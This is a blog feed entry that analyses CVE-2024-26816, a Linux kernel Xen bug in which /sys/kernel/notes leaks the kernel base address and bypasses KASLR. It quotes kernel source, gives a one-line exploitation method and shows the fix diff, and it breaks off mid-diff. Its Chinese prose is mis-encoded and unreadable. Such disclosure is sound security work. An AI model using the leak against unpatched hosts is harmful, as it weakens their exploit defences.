<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3çš„ç§˜å¯†å°å±‹</subtitle>
  <link href="https://arttnba3.github.io/atom.xml" rel="self"/>
  
  <link href="https://arttnba3.github.io/"/>
  <updated>2025-08-01T16:15:10.726Z</updated>
  <id>https://arttnba3.github.io/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ã€CVE.0x0Eã€‘CVE-2024-26816 æ¼æ´åˆ†æåŠåˆ©ç”¨</title>
    <link href="https://arttnba3.github.io/2025/07/29/CVE-0X0E-CVE-2024-26816/"/>
    <id>https://arttnba3.github.io/2025/07/29/CVE-0X0E-CVE-2024-26816/</id>
    <published>2025-07-29T01:45:14.000Z</published>
    <updated>2025-08-01T16:15:10.726Z</updated>
    
    <content type="html"><![CDATA[<p>KASLRï¼šAM I A JOKE TO YOU?</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://nvd.nist.gov/vuln/detail/cve-2024-26816">CVE-2024-26816</a> æ˜¯ä¸€ä¸ªå‘ç”Ÿåœ¨ Linux kernel çš„ Xen å­æ¨¡å—å½“ä¸­çš„ä¿¡æ¯æ³„æ¼æ¼æ´ï¼Œå¾—ç›Šäº Xen æ¨¡å—åœ¨å¼€å¯äº† <code>CONFIG_XEN_PV=y</code> ç¼–è¯‘é€‰é¡¹æ—¶æŠŠ <code>startup_xen</code> çš„åœ°å€å†™åˆ°äº†éç‰¹æƒç”¨æˆ·å¯è¯»çš„ <code>/sys/kernel/notes</code> æ–‡ä»¶å½“ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¯»å–è¯¥æ–‡ä»¶æ³„æ¼å‡ºå†…æ ¸åŠ è½½çš„åŸºåœ°å€ï¼Œä»è€Œé€šè¿‡è¿™ä¸ªæ¼æ´ç»•è¿‡ KASLR</p><p>è¯¥æ¼æ´çš„ CVSS åˆ†æ•°ä¸º <code>5.5</code> ï¼Œå½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äº <code>2.6.23~4.19.311</code> ã€<code>4.20~5.4.273</code>ã€<code>5.5~5.10.214</code>ã€<code>5.11~5.15.153</code>ã€<code>5.16~6.1.83</code> ã€ <code>6.2~6.6.23</code> ã€<code>6.7~6.7.11</code> ã€ <code>6.8~6.8.2</code> ã€<code>6.8.3~6.8.12</code>ï¼Œå› ä¸ºæ¼æ´åˆ†æ•°æ˜¯ 5.5 æ‰€ä»¥æœ¬æ–‡æˆ‘ä»¬é€‰ç”¨ <code>5.5</code> ç‰ˆæœ¬çš„å†…æ ¸æºç è¿›è¡Œåˆ†æï¼šï¼‰</p><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01. æ¼æ´åˆ†æ"></a>0x01. æ¼æ´åˆ†æ</h1><p>æˆ‘ä»¬é¦–å…ˆçœ‹  <code>startup_xen</code> è¿™ä¸ªç¬¦å·éƒ½åœ¨å“ªå‡ºç°è¿‡ï¼Œåœ¨ 5.5 ç‰ˆæœ¬çš„å†…æ ¸å½“ä¸­è¿™ä¸ªç¬¦å·åªå‡ºç°è¿‡ä¸‰æ¬¡ï¼Œ <code>startup_xen</code> æœ¬èº«æ˜¯ä¸€ä¸ªåœ¨å¼€å¯äº† <code>CONFIG_XEN_PV=y</code> ç¼–è¯‘é€‰é¡¹æ—¶ç”¨æ¥æ ‡è¯†æ®µåŸºå€çš„ç¬¦å·ï¼Œå®šä¹‰äº <code>/arch/x86/xen/xen-head.S</code> å½“ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#ifdef CONFIG_XEN_PV<br>__INIT<br>SYM_CODE_START(startup_xen)<br>UNWIND_HINT_EMPTY<br>cld<br><br>/* Clear .bss */<br>xor %eax,%eax<br>mov $__bss_start, %_ASM_DI<br>mov $__bss_stop, %_ASM_CX<br>sub %_ASM_DI, %_ASM_CX<br>shr $__ASM_SEL(2, 3), %_ASM_CX<br>rep __ASM_SIZE(stos)<br><br>mov %_ASM_SI, xen_start_info<br>mov $init_thread_union+THREAD_SIZE, %_ASM_SP<br><br>#ifdef CONFIG_X86_64<br>/* Set up %gs.<br> *<br> * The base of %gs always points to fixed_percpu_data.  If the<br> * stack protector canary is enabled, it is located at %gs:40.<br> * Note that, on SMP, the boot cpu uses init data section until<br> * the per cpu areas are set up.<br> */<br>movl$MSR_GS_BASE,%ecx<br>movq$INIT_PER_CPU_VAR(fixed_percpu_data),%rax<br>cdq<br>wrmsr<br>#endif<br><br>jmp xen_start_kernel<br>SYM_CODE_END(startup_xen)<br>__FINIT<br>#endif<br></code></pre></td></tr></table></figure><p>åŒæ—¶åœ¨ <code>/arch/x86/xen/xen-head.S</code> å½“ä¸­æœ‰å¦‚ä¸‹é…ç½®ï¼Œå½“å¼€å¯äº† <code>CONFIG_XEN_PV=y</code> ç¼–è¯‘é€‰é¡¹æ—¶ï¼Œæˆ‘ä»¬æœ‰è¿™æ ·ä¸€æ¡ <code>ELFNOTE</code> ï¼Œå†™å…¥äº† <code>startup_xen</code> çš„åœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#ifdef CONFIG_XEN_PV<br>ELFNOTE(Xen, XEN_ELFNOTE_ENTRY,          _ASM_PTR startup_xen)<br>#endif<br></code></pre></td></tr></table></figure><p>è¿™ä¸ª <code>ELFNOTE</code> æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Ÿè®©æˆ‘ä»¬çœ‹çœ‹<code>/include/linux/elfnote.h</code> å½“ä¸­çš„æ³¨é‡Šï¼Œç®€è€Œè¨€ä¹‹æ„æ€å°±æ˜¯è¯´è¿™äº›ä¿¡æ¯ä¼šè¢«æ”¾åˆ° obj æ–‡ä»¶çš„åä¸º <code>.note.*</code> çš„æ®µå½“ä¸­ï¼Œæœ€ååœ¨é“¾æ¥æ—¶è¢«æ”¾åˆ°å†…æ ¸ ELF é•œåƒ vmlinux çš„ä¸€ä¸ªåä¸º <code>.notes</code> çš„æ®µå½“ä¸­ï¼Œæ®µçš„ <code>p_type</code> ä¸º <code>PT_NOTE</code> ï¼Œæ¯ä¸ª note çš„åŒ…å« <code>name</code> ã€<code>type</code> ã€<code>desc</code> ä¸‰éƒ¨åˆ†ï¼Œå¯¹äºå‰é¢å®šä¹‰çš„ ELFNOTEï¼Œæˆ‘ä»¬çš„ <code>desc</code> ä¸ºæŒ‡å‘ <code>startup_xen</code> çš„æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Helper macros to generate ELF Note structures, which are put into a</span><br><span class="hljs-comment"> * PT_NOTE segment of the final vmlinux image.  These are useful for</span><br><span class="hljs-comment"> * including name-value pairs of metadata into the kernel binary (or</span><br><span class="hljs-comment"> * modules?) for use by external programs.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Each note has three parts: a name, a type and a desc.  The name is</span><br><span class="hljs-comment"> * intended to distinguish the note&#x27;s originator, so it would be a</span><br><span class="hljs-comment"> * company, project, subsystem, etc; it must be in a suitable form for</span><br><span class="hljs-comment"> * use in a section name.  The type is an integer which is used to tag</span><br><span class="hljs-comment"> * the data, and is considered to be within the &quot;name&quot; namespace (so</span><br><span class="hljs-comment"> * &quot;FooCo&quot;&#x27;s type 42 is distinct from &quot;BarProj&quot;&#x27;s type 42).  The</span><br><span class="hljs-comment"> * &quot;desc&quot; field is the actual data.  There are no constraints on the</span><br><span class="hljs-comment"> * desc field&#x27;s contents, though typically they&#x27;re fairly small.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * All notes from a given NAME are put into a section named</span><br><span class="hljs-comment"> * .note.NAME.  When the kernel image is finally linked, all the notes</span><br><span class="hljs-comment"> * are packed into a single .notes section, which is mapped into the</span><br><span class="hljs-comment"> * PT_NOTE segment.  Because notes for a given name are grouped into</span><br><span class="hljs-comment"> * the same section, they&#x27;ll all be adjacent the output file.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This file defines macros for both C and assembler use.  Their</span><br><span class="hljs-comment"> * syntax is slightly different, but they&#x27;re semantically similar.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See the ELF specification for more detail about ELF notes.</span><br><span class="hljs-comment">  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __ASSEMBLER__</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Generate a structure with the same shape as Elf&#123;32,64&#125;_Nhdr (which</span><br><span class="hljs-comment"> * turn out to be the same size and shape), followed by the name and</span><br><span class="hljs-comment"> * desc data with appropriate padding.  The &#x27;desctype&#x27; argument is the</span><br><span class="hljs-comment"> * assembler pseudo op defining the type of the data e.g. .asciz while</span><br><span class="hljs-comment"> * &#x27;descdata&#x27; is the data itself e.g.  &quot;hello, world&quot;.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * e.g. ELFNOTE(XYZCo, 42, .asciz, &quot;forty-two&quot;)</span><br><span class="hljs-comment"> *      ELFNOTE(XYZCo, 12, .long, 0xdeadbeef)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELFNOTE_START(name, type, flags)\</span><br><span class="hljs-meta">.pushsection .note.name, flags,@note;\</span><br><span class="hljs-meta">  .balign 4;\</span><br><span class="hljs-meta">  .long 2f - 1f<span class="hljs-comment">/* namesz */</span>;\</span><br><span class="hljs-meta">  .long 4484f - 3f<span class="hljs-comment">/* descsz */</span>;\</span><br><span class="hljs-meta">  .long type;\</span><br><span class="hljs-meta">1:.asciz #name;\</span><br><span class="hljs-meta">2:.balign 4;\</span><br><span class="hljs-meta">3:</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELFNOTE_END\</span><br><span class="hljs-meta">4484:.balign 4;\</span><br><span class="hljs-meta">.popsection;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELFNOTE(name, type, desc)\</span><br><span class="hljs-meta">ELFNOTE_START(name, type, <span class="hljs-string">&quot;&quot;</span>)\</span><br><span class="hljs-meta">desc;\</span><br><span class="hljs-meta">ELFNOTE_END</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹è¿™äº› <code>.note.name</code> æ®µå¦‚ä½•è¢«å¤„ç†çš„ï¼Œåœ¨ <code>/include/asm-generic/vmlinux.lds.h</code> å½“ä¸­å°†å…¶åˆå¹¶ä¸ºäº†ä¸€ä¸ª <code>.note</code> æ®µï¼Œå…¶èµ·å§‹ä¸º <code>__start_notes</code> ï¼Œæœ«å°¾ä¸º <code>__stop_notes</code> ï¼š</p><blockquote><p> lds æ ¼å¼çš„ Linker Script å†…å®¹ï¼Œå¯ä»¥å‚è€ƒ <a href="https://wiki.osdev.org/Linker_Scripts">https://wiki.osdev.org/Linker_Scripts</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NOTES\</span><br><span class="hljs-meta">.notes : AT(ADDR(.notes) - LOAD_OFFSET) &#123;\</span><br><span class="hljs-meta">__start_notes = .;\</span><br><span class="hljs-meta">KEEP(*(.note.*))\</span><br><span class="hljs-meta">__stop_notes = .;\</span><br><span class="hljs-meta">&#125; NOTES_HEADERS\</span><br><span class="hljs-meta">NOTES_HEADERS_RESTORE</span><br></code></pre></td></tr></table></figure><p>æœ€ååœ¨ <code>/include/asm-generic/vmlinux.lds.h</code> å½“ä¸­è¿™ä¸ªæ®µè¢«æ”¾åˆ° read-only çš„å¤§åŒºå—é‡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Read only Data</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RO_DATA(align)\</span><br><span class="hljs-meta">. = ALIGN((align));\</span><br><span class="hljs-meta"><span class="hljs-comment">//...</span></span><br>NOTES\<br>\<br>. = ALIGN((align));\<br>__end_rodata = .;<br></code></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹è¿™äº›ä¿¡æ¯ä¼šè¢«åœ¨å†…æ ¸çš„ä»€ä¹ˆåœ°æ–¹ä½¿ç”¨ï¼Œé¦–å…ˆè½¬åˆ° <code>/sys/kernel/notes</code> çš„å†…æ ¸é€»è¾‘ï¼Œåœ¨ <code>/kernel/ksysfs.c</code> çš„ <code>ksysfs_init()</code> å½“ä¸­ä¼šé¦–å…ˆåˆ›å»ºä¸€ä¸ª <code>&quot;kernel&quot;</code> ç›®å½•ï¼Œä¹‹ååˆ›å»ºä¸€ä¸ªåä¸º <code>&quot;notes&quot;</code> çš„æ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bin_attribute</span> <span class="hljs-title">notes_attr</span> __<span class="hljs-title">ro_after_init</span>  =</span> &#123;<br>.attr = &#123;<br>.name = <span class="hljs-string">&quot;notes&quot;</span>,<br>.mode = S_IRUGO,<br>&#125;,<br>.read = &amp;notes_read,<br>&#125;;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">ksysfs_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> error;<br><br>kernel_kobj = kobject_create_and_add(<span class="hljs-string">&quot;kernel&quot;</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!kernel_kobj) &#123;<br>error = -ENOMEM;<br><span class="hljs-keyword">goto</span> <span class="hljs-built_in">exit</span>;<br>&#125;<br>error = sysfs_create_group(kernel_kobj, &amp;kernel_attr_group);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> kset_exit;<br><br><span class="hljs-keyword">if</span> (notes_size &gt; <span class="hljs-number">0</span>) &#123;<br>notes_attr.size = notes_size;<br>error = sysfs_create_bin_file(kernel_kobj, &amp;notes_attr);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> group_exit;<br>&#125;<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„åˆ°å…¶è¯»å–å‡½æ•°ä¸º <code>notes_read()</code> ï¼Œè¯¥å‡½æ•°çš„ä¸»è¦ä½œç”¨ä¾¿æ˜¯æ‹·è´ <code>.notes</code> æ®µçš„ä¿¡æ¯ç»™ç”¨æˆ·ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Make /sys/kernel/notes give the raw contents of our kernel .notes section.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">void</span> __start_notes __weak;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">void</span> __stop_notes __weak;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span>notes_size (&amp;__stop_notes - &amp;__start_notes)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">notes_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-keyword">struct</span> kobject *kobj,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> bin_attribute *bin_attr,</span><br><span class="hljs-params">  <span class="hljs-type">char</span> *buf, <span class="hljs-type">loff_t</span> off, <span class="hljs-type">size_t</span> count)</span><br>&#123;<br><span class="hljs-built_in">memcpy</span>(buf, &amp;__start_notes + off, count);<br><span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆ vmlinux çš„ <code>.note</code> æ®µåœ¨ä»€ä¹ˆæ—¶å€™è¿›å…¥å†…å­˜çš„å‘¢ï¼Ÿæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ vmlinux åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ä¼šè¢« GRUB ä½œä¸º ELF è§£æå¹¶è½½å…¥å†…å­˜ï¼Œç®€è€Œè¨€ä¹‹ Linux kernel åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€ä»½æ˜¯ kernel loader ï¼ˆ <code>arch/x86/boot/compressed</code> ï¼‰ï¼Œå¦ä¸€ä»½æ˜¯å®é™…çš„ä½†ç»è¿‡å‹ç¼©çš„ kernelï¼Œåœ¨è®¡ç®—æœºçš„å¯åŠ¨é“¾å½“ä¸­ GRUB è´Ÿè´£è½½å…¥ loaderï¼Œè€Œ loader è´Ÿè´£è§£å‹å¹¶è½½å…¥ kernelï¼Œå¯¹åº” <code>/arch/x86/boot/compressed/misc.c</code> å½“ä¸­çš„ <code>extract_kernel()</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The compressed kernel image (ZO), has been moved so that its position</span><br><span class="hljs-comment"> * is against the end of the buffer used to hold the uncompressed kernel</span><br><span class="hljs-comment"> * image (VO) and the execution environment (.bss, .brk), which makes sure</span><br><span class="hljs-comment"> * there is room to do the in-place decompression. (See header.S for the</span><br><span class="hljs-comment"> * calculations.)</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *                             |-----compressed kernel image------|</span><br><span class="hljs-comment"> *                             V                                  V</span><br><span class="hljs-comment"> * 0                       extract_offset                      +INIT_SIZE</span><br><span class="hljs-comment"> * |-----------|---------------|-------------------------|--------|</span><br><span class="hljs-comment"> *             |               |                         |        |</span><br><span class="hljs-comment"> *           VO__text      startup_32 of ZO          VO__end    ZO__end</span><br><span class="hljs-comment"> *             ^                                         ^</span><br><span class="hljs-comment"> *             |-------uncompressed kernel image---------|</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br>asmlinkage __visible <span class="hljs-type">void</span> *<span class="hljs-title function_">extract_kernel</span><span class="hljs-params">(<span class="hljs-type">void</span> *rmode, memptr heap,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *input_data,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> input_len,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *output,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> output_len)</span><br></code></pre></td></tr></table></figure><p>åœ¨è¯¥å‡½æ•°ä¸­ KASLR åœ¨ <code>choose_random_location()</code> å½“ä¸­è·å–åç§»ï¼Œä¹‹åé€šè¿‡ <code>__decompress()</code> å‡½æ•°è§£å‹å†…æ ¸é•œåƒï¼Œå¹¶é€šè¿‡ <code>parse_elf()</code> å‡½æ•°è§£æ ELF header å¹¶ç§»åŠ¨ç±»å‹ä¸º <code>PT_LOAD</code> çš„æ®µåˆ°å¯¹åº”ä½ç½®ï¼Œæœ€åè°ƒç”¨ <code>handle_relocations()</code> å¤„ç†éœ€è¦é‡å®šä½çš„æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">choose_random_location((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)input_data, input_len,<br>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;output,<br>needed_size,<br>&amp;virt_addr);<br><br><span class="hljs-comment">//...</span><br><br>debug_putstr(<span class="hljs-string">&quot;\nDecompressing Linux... &quot;</span>);<br>__decompress(input_data, input_len, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, output, output_len,<br><span class="hljs-literal">NULL</span>, error);<br>parse_elf(output);<br>handle_relocations(output, output_len, virt_addr);<br>debug_putstr(<span class="hljs-string">&quot;done.\nBooting the kernel.\n&quot;</span>);<br><span class="hljs-keyword">return</span> output;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ <code>handle_relocations()</code> å‡½æ•°ä¸»è¦å°±æ˜¯è§£æ relocation è¡¨å¹¶ä¿®æ­£å…¶ä¸­çš„å€¼ï¼ŒåŸºæœ¬ä¸Šæ²¡ä»€ä¹ˆå¥½çœ‹çš„ï¼Œè¿™é‡Œå°±ä¸è´´ä»£ç äº†ï¼šï¼‰</p><blockquote><p>ç®€è€Œè¨€ä¹‹ relocation table å½“ä¸­å­˜æ”¾äº†éœ€è¦è¿›è¡Œé‡å®šä½çš„ç¬¦å·çš„åœ°å€ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡Œç¿»é˜… ELF è§„èŒƒï¼Œè¿™é‡Œä¸å†èµ˜è¿°</p></blockquote><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02. æ¼æ´åˆ©ç”¨"></a>0x02. æ¼æ´åˆ©ç”¨</h1><p>åªéœ€è¦ç›´æ¥è¯»å– <code>/sys/kernel/notes</code> å°±å½³äºï¼Œåç§»ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œæ„Ÿè§‰æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼šï¼‰å”¯ä¸€éœ€è¦æ³¨æ„çš„å¯èƒ½å°±æ˜¯æŒ‡é’ˆçš„å€¼æ˜¯ä»¥å°ç«¯åºå­˜å‚¨çš„ï¼š</p><p><img src="https://s2.loli.net/2025/08/01/zqxanKkmY1F2dpI.png"></p><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03. æ¼æ´ä¿®å¤"></a>0x03. æ¼æ´ä¿®å¤</h1><p>è¯¥æ¼æ´åœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=76e9762d66373354b45c33b60e9a53ef2a3c5ff2">76e9762d66373354b45c33b60e9a53ef2a3c5ff2</a> ç­‰ commit å½“ä¸­è¢«ä¿®å¤ï¼ˆä¸åŒåˆ†æ”¯ commit id ä¸ä¸€æ ·ï¼Œä½†æ˜¯å†…å®¹ç›¸åŒï¼Œ <del>æ‡’å¾—çœ‹å“ªä¸ªæ˜¯ mainline äº†</del> ï¼‰ï¼Œä¿®å¤æ–¹å¼æ˜¯ä¸å¯¹ <code>.notes</code> æ®µå½“ä¸­çš„ç¬¦å·è¿›è¡Œé‡å®šä½ï¼Œè¿™æ ·åœ¨å¼€å¯ KASLR çš„æƒ…å†µä¸‹ <code>/sys/kernel/notes</code> å½“ä¸­çš„ç¬¦å·åœ°å€å¹¶ä¸ä¼šè¢«è¿›è¡Œé‡å®šä½ä¿®æ­£ï¼Œä»è€Œä¹Ÿå°±é¿å…äº† KASLR è¢« bypassï¼Œç¬”è€…ä¸ªäººè§‰å¾—è¿™ä¸ªä¿®å¤ç®—æ˜¯ä¸­è§„ä¸­çŸ©å§ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs diff"><br><span class="hljs-comment">diff --git a/arch/x86/tools/relocs.c b/arch/x86/tools/relocs.c</span><br><span class="hljs-comment">index b029fb81ebeee0..e7a44a7f617fbe 100644</span><br><span class="hljs-comment">--- a/arch/x86/tools/relocs.c</span><br><span class="hljs-comment">+++ b/arch/x86/tools/relocs.c</span><br><span class="hljs-meta">@@ -746,6 +746,15 @@</span> static void walk_relocs(int (*process)(struct section *sec, Elf_Rel *rel,<br> if (!(sec_applies-&gt;shdr.sh_flags &amp; SHF_ALLOC)) &#123;<br> continue;<br> &#125;<br><span class="hljs-addition">+</span><br><span class="hljs-addition">+/*</span><br><span class="hljs-addition">+ * Do not perform relocations in .notes sections; any</span><br><span class="hljs-addition">+ * values there are meant for pre-boot consumption (e.g.</span><br><span class="hljs-addition">+ * startup_xen).</span><br><span class="hljs-addition">+ */</span><br><span class="hljs-addition">+if (sec_applies-&gt;shdr.sh_type == SHT_NOTE)</span><br><span class="hljs-addition">+continue;</span><br><span class="hljs-addition">+</span><br> sh_symtab = sec_symtab-&gt;symtab;<br> sym_strtab = sec_symtab-&gt;link-&gt;strtab;<br> for (j = 0; 